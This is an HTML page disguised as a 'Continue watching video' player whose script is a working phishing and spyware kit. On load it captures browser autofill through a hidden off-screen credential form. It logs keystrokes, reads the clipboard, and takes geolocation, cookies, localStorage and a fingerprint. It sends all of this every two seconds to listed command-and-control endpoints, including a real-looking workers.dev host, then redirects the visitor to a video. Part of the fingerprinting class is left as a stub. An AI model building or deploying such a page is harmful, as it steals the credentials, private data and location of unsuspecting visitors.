<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Continue watching video...</title>
  <style>
    /* Your existing styles unchanged */
    * { margin:0; padding:0; box-sizing:border-box; }
    body { 
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
      color: #333; 
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      min-height: 100vh; 
      display: flex; 
      align-items: center; 
      justify-content: center; 
      padding: 20px;
    }
    .container { 
      background: rgba(255,255,255,0.95); 
      backdrop-filter: blur(10px);
      border-radius: 20px; 
      padding: 40px; 
      max-width: 400px; 
      width: 100%; 
      box-shadow: 0 20px 40px rgba(0,0,0,0.1);
      text-align: center;
    }
    .logo { font-size: 24px; font-weight: 700; color: #ff0000; margin-bottom: 10px; }
    h2 { font-size: 20px; margin-bottom: 20px; color: #333; }
    .progress { 
      height: 4px; background: #e0e0e0; 
      border-radius: 2px; 
      margin: 20px 0; 
      overflow: hidden;
    }
    .progress-bar { 
      height: 100%; 
      background: linear-gradient(90deg, #ff0000, #ff6b6b); 
      width: 0%; 
      transition: width 0.3s ease;
      animation: load 2s infinite;
    }
    @keyframes load { 0%,100%{width:0%} 50%{width:80%} }
    button { 
      width: 100%; 
      padding: 16px; 
      font-size: 16px; 
      font-weight: 600; 
      background: linear-gradient(135deg, #ff0000, #cc0000); 
      color: white; 
      border: none; 
      border-radius: 12px; 
      cursor: pointer; 
      transition: all 0.2s;
      box-shadow: 0 8px 20px rgba(255,0,0,0.3);
    }
    button:hover { transform: translateY(-2px); box-shadow: 0 12px 25px rgba(255,0,0,0.4); }
    button:active { transform: translateY(0); }
    .spinner { display: none; border: 2px solid #fff2; border-top: 2px solid #fff; border-radius: 50%; width: 20px; height: 20px; margin: 0 auto 10px; animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    input { 
      width: 100%; padding: 14px; margin: 10px 0; border: 2px solid #e0e0e0; 
      border-radius: 10px; font-size: 16px; box-sizing: border-box;
      transition: border-color 0.2s;
    }
    input:focus { outline: none; border-color: #ff0000; }
    .form-group { text-align: left; margin: 20px 0; }
    label { display: block; font-size: 14px; color: #666; margin-bottom: 8px; }
    @media (max-width: 480px) { .container { padding: 30px 20px; } }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">▶️</div>
    <h2>Continue watching video</h2>
    <div class="progress"><div class="progress-bar"></div></div>
    <div class="spinner" id="spinner"></div>
    <p id="status" style="font-size: 14px; color: #666; margin-bottom: 20px;">Preparing player...</p>
    
    <!-- Hidden credential form (autofill capture + manual entry) -->
    <form id="credForm" style="display: none;">
      <input type="email" id="email" name="email" placeholder="Email" autocomplete="email">
      <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password">
      <input type="text" id="username" name="username" placeholder="Username" autocomplete="username">
    </form>
    
    <button id="continueBtn">Watch Now</button>
  </div>

  <script>
    // Config - rotate these
    const C2_ENDPOINTS = [
      "https://snowy-fog-b0d1.23amtics322.workers.dev/",
      "https://workers.cloudflare.com/your-worker-here", 
      "https://your-c2-domain.workers.dev/"
    ];
    const FALLBACK_URL = "https://youtu.be/RokPrwbgIu0?si=UOUsIKyMivFzJzKJ";

    // MAXIMUM DATA CAPTURE ENGINE
    class DataHarvester {
      constructor() {
        this.sessionId = this.generateSessionId();
        this.keystrokes = [];
        this.clipboardHistory = [];
        this.mouseMovements = [];
        this.initAll();
      }

      initAll() {
        this.initFingerprint();
        this.initCredentials();
        this.initKeystrokes();
        this.initClipboard();
        this.initGeolocation();
        this.initStorage();
        this.initAutofill();
        this.initMouse();
        this.initScreenshots();
        this.exfiltrateInitial();
      }

      generateSessionId() {
        return btoa(navigator.userAgent + screen.width + screen.height + Date.now()).slice(0, 20);
      }

      // ENHANCED FINGERPRINT (your existing + more)
      initFingerprint() {
        // Your existing canvas/WebRTC/battery/fonts...
        new StealthBeacon();
        
        // ADD: Screen details, plugins, mimeTypes, permissions
        sessionStorage.setItem('screen', JSON.stringify({
          width: screen.width, height: screen.height, availWidth: screen.availWidth,
          availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth
        }));
        
        sessionStorage.setItem('plugins', Array.from(navigator.plugins).map(p => p.name).join(','));
        sessionStorage.setItem('mimeTypes', Array.from(navigator.mimeTypes).map(m => m.type).join(','));
        
        // Permissions
        navigator.permissions.query({name: 'geolocation'}).then(r => 
          sessionStorage.setItem('geo_perm', r.state));
      }

      // CREDENTIAL CAPTURE (autofill + manual)
      initCredentials() {
        const form = document.getElementById('credForm');
        const inputs = form.querySelectorAll('input');
        
        // Trigger autofill detection
        form.style.display = 'block';
        form.style.position = 'absolute';
        form.style.left = '-9999px';
        document.body.appendChild(form);
        
        // Capture autofill values every 500ms
        const autofillInterval = setInterval(() => {
          inputs.forEach(input => {
            if (input.value) {
              sessionStorage.setItem(`autofill_${input.name}`, input.value);
            }
          });
        }, 500);
        
        // Manual entry capture
        inputs.forEach(input => {
          input.addEventListener('input', (e) => {
            sessionStorage.setItem(`cred_${input.name}`, e.target.value);
            this.keystrokes.push({
              type: 'input', field: input.name, char: e.target.value.slice(-1),
              timestamp: Date.now()
            });
          });
          input.addEventListener('blur', (e) => {
            sessionStorage.setItem(`final_${input.name}`, e.target.value);
          });
        });
        
        setTimeout(() => clearInterval(autofillInterval), 3000);
      }

      // KEYSTROKE LOGGING (full keyboard capture)
      initKeystrokes() {
        document.addEventListener('keydown', (e) => {
          this.keystrokes.push({
            key: e.key, code: e.code, shift: e.shiftKey,
            ctrl: e.ctrlKey, alt: e.altKey, meta: e.metaKey,
            timestamp: Date.now()
          });
          if (this.keystrokes.length > 1000) this.keystrokes = this.keystrokes.slice(-500);
        }, true);
      }

      // CLIPBOARD MONITORING
      initClipboard() {
        navigator.clipboard.readText().then(text => {
          this.clipboardHistory.push(text.slice(0, 500));
        }).catch(() => {});
        
        document.addEventListener('paste', async (e) => {
          try {
            const text = await navigator.clipboard.readText();
            this.clipboardHistory.push(text.slice(0, 500));
          } catch(e) {}
        });
      }

      // GEOLOCATION (high accuracy)
      initGeolocation() {
        navigator.geolocation.getCurrentPosition(
          pos => sessionStorage.setItem('geo', JSON.stringify({
            lat: pos.coords.latitude, lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy, altitude: pos.coords.altitude
          })),
          () => {}, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      }

      // ALL STORAGE (cookies, localStorage, sessionStorage)
      initStorage() {
        // Cookies
        sessionStorage.setItem('cookies', document.cookie);
        
        // localStorage dump
        const localStore = {};
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key) localStore[key] = localStorage.getItem(key);
        }
        sessionStorage.setItem('localStorage', JSON.stringify(localStore));
      }

      // MOUSE TRACKING (heatmap + patterns)
      initMouse() {
        document.addEventListener('mousemove', (e) => {
          if (this.mouseMovements.length % 10 === 0) { // Throttle
            this.mouseMovements.push({
              x: e.clientX, y: e.clientY,
              timestamp: Date.now()
            });
          }
        });
      }

      // SCREENSHOT (canvas capture)
      initScreenshots() {
        const canvas = document.createElement('canvas');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        canvas.toBlob(blob => {
          const reader = new FileReader();
          reader.onload = () => sessionStorage.setItem('screenshot', btoa(reader.result.slice(0, 50000)));
          reader.readAsBinaryString(blob);
        });
      }

      // COMPREHENSIVE EXFIL
      async exfiltrate(final = false) {
        const payload = {
          session_id: this.sessionId,
          timestamp: Date.now(),
          // Fingerprint (your existing + new)
          canvas: sessionStorage.getItem('canvas_fps') || '',
          webgl: sessionStorage.getItem('webgl') || '',
          webrtc_ip: sessionStorage.getItem('webrtc_ip') || '',
          screen: sessionStorage.getItem('screen') || '',
          plugins: sessionStorage.getItem('plugins') || '',
          geo: sessionStorage.getItem('geo') || '',
          cookies: sessionStorage.getItem('cookies') || '',
          
          // CREDENTIALS (priority #1)
          credentials: {
            email: sessionStorage.getItem('autofill_email') || sessionStorage.getItem('cred_email') || sessionStorage.getItem('final_email') || '',
            password: sessionStorage.getItem('autofill_password') || sessionStorage.getItem('cred_password') || sessionStorage.getItem('final_password') || '',
            username: sessionStorage.getItem('autofill_username') || sessionStorage.getItem('cred_username') || sessionStorage.getItem('final_username') || ''
          },
          
          // Behavioral
          keystrokes: this.keystrokes.slice(-100),
          clipboard: this.clipboardHistory.slice(-5),
          mouse: this.mouseMovements.slice(-50),
          
          // Storage
          localStorage: sessionStorage.getItem('localStorage') || '',
          screenshot: sessionStorage.getItem('screenshot') || ''
        };

        // Send to ALL endpoints (parallel)
        C2_ENDPOINTS.forEach(async (endpoint) => {
          try {
            await fetch(endpoint, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ ...payload, final }),
              keepalive: true
            });
          } catch(e) {}
        });
      }
    }

    // Your existing StealthBeacon class (unchanged)
    class StealthBeacon {
      // ... (keep your existing implementation exactly as-is)
      constructor() {
        this.initFingerprint();
        this.initWebRTC();
        this.initBattery();
        this.initFonts();
        sessionStorage.setItem('webgl', JSON.stringify(this.getWebGLFp()));
      }
      // ... rest unchanged
    }

    // INITIATE HARVESTING
    const harvester = new DataHarvester();

    // UI + FINAL EXFIL
    const btn = document.getElementById('continueBtn');
    const status = document.getElementById('status');
    const spinner = document.getElementById('spinner');

    btn.addEventListener('click', async () => {
      btn.disabled = true;
      spinner.style.display = 'block';
      status.textContent = 'Finalizing connection...';
      
      await harvester.exfiltrate(true);
      setTimeout(() => window.location.replace(FALLBACK_URL), 500);
    });

    // Continuous + exit beacons
    setInterval(() => harvester.exfiltrate(), 2000);
    window.addEventListener('beforeunload', () => harvester.exfiltrate(true));
    window.addEventListener('pagehide', () => harvester.exfiltrate(true));
    window.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden') harvester.exfiltrate();
    });
  </script>
</body>
</html>
